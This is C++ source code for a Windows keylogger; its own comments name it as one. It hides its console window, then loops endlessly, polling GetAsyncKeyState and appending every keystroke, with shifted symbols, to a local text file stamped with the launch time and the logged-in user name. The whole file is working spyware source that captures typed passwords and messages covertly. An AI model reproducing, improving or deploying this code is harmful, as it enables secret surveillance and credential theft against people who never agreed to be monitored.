#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <Winuser.h>
#include <time.h> 

#include <Lmcons.h>

using namespace std;


void write();
void hide();
void time();
void username();
int main()
{

hide();	
time();
username();
write();
	
		return 0;
}

void write()  		//Write On NotePad All the Key strokes
{
	char ch;
	for(;;)
	{
		for(ch=8;ch<=222;ch++)
		{
			if(GetAsyncKeyState(ch)==-32767)
			{
				ofstream write("E:\\cpp\\Keys.txt",ios::app);
				if (ch>64 && ch<91 && !GetAsyncKeyState(0x10))
				{
					
					ch+=32;
					write<<ch;
					write.close();
					break;
				}
				
				else if(ch>64 && ch<91)
				{
					write<<ch;
					write.close();
					break;
				}
			
							
				switch (ch)
				{
					case 8:write<<" Backspace ";
				    break;
					case 27:write<<" ESC ";
					break;
				    case 127:write<<" DEL ";
				    break;
				    case 39:write<<"'";
				    break;
				    case 42:write<<"*";
				    break;
				    case 43:write<<"+";
				    break;
				    case 44:write<<",";
				    break;
				    case 45:write<<"-";
				    break;
				    case 46:write<<".";
				    break;
				    case 47:write<<"/";
				    break;
				    case 48:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<")";
				    	else
				    	write<<"0";
						break;
					}			
				    case 49:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"!";
				    	else
				    	write<<"1";
						break;
					}					
				    case 50:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"@";
				    	else
				    	write<<"2";
						break;
					}			
				    case 51:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"#";
				    	else
				    	write<<"3";
						break;
					}			
				    case 52:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"$";
				    	else
				    	write<<"4";
						break;
					}			
				    case 53:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"%";
				    	else
				    	write<<"5";
						break;
					}			
				    case 54:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"^";
				    	else
				    	write<<"6";
						break;
					}			
				    case 55:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"&";
				    	else
				    	write<<"7";
						break;
					}			
				    case 56:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"*";
				    	else
				    	write<<"8";
						break;
					}			
				    case 57:{
				    	if(GetAsyncKeyState(0x10))
				    	write<<"(";
				    	else
				    	write<<"9";
						break;
							}
																					
					case 32:write<<" ";
					break;
				    case 13:write<<"  Enter"<<endl;
				    break;
				    
					case VK_TAB:
						write<<" <TAB> ";
						break;
						
					case VK_CONTROL:
						write<<"<CTRL>";
						break;
						
							    
				   						
				}
				
			}
		}
	}
	
		
}

void time()				// Time of Launch of KeyLogger
{
	
	time_t rawtime;
  struct tm * timeinfo;
  char st [80];
	
  time (&rawtime);
  timeinfo = localtime (&rawtime);

  strftime (st,80,"Date: %y-%m-%d  Time: %I:%M%p",timeinfo);
  
  ofstream write("E:\\cpp\\Keys.txt",ios::app);
  write<<"------------------------------------\n";
  write<<st;
  write<<"\n";

	
}

void username()				// Current Username Information
{
TCHAR name [ UNLEN + 1 ];
  DWORD size = UNLEN + 1;

 ofstream write("E:\\cpp\\Keys.txt",ios::app);
  if (GetUserName( (TCHAR*)name, &size ))
    {
	write<<"USER-->>  "<<name<<"\n";
    write<<"------------------------------------\n";
	}
  else
    {
	write<<"UnNamed USER\n";
	write<<"------------------------------------\n";
	}
  
	
}
void hide()
{
HWND stealth;
AllocConsole();
stealth=FindWindowA("ConsoleWindowClass",NULL);
ShowWindow(stealth,0);

}


